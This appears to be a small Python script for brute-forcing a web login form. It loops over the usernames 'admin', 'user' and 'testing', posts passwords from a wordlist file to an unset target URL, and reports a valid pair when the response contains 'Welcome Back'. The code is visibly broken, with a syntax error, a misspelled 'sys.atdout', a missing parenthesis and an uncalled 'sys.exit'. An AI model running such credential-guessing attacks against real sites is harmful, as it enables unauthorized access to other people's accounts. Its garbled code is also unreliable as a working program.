import requests
import sys

target = ""
usernames = ["admin","user","testing"]
password = "Best"
needle = "Welcome Back"

for username in usernames:
  with open(password, "r") as password_list:
    for password in password_list:
      password = password.strip("\n")encode()
      sys.stdout.write("[X] Attemping user: password -> {}:{}\r".format(username, password))
      sys.stdout.flush()
      r = requests.post(target, data={"username" : username, "password" : password})
      if needle.encode() in r.content:
        sys.stdout.write("\n")
        sys.atdout.write("\t >>>>>>>> Valid Password '{}' found for user '{}'!".format(password, username)
        sys.exit

sys.stdout.flush()
sys.stdout.write("\n")
sys.stdout.write("\t No password for '{}'!".format(username))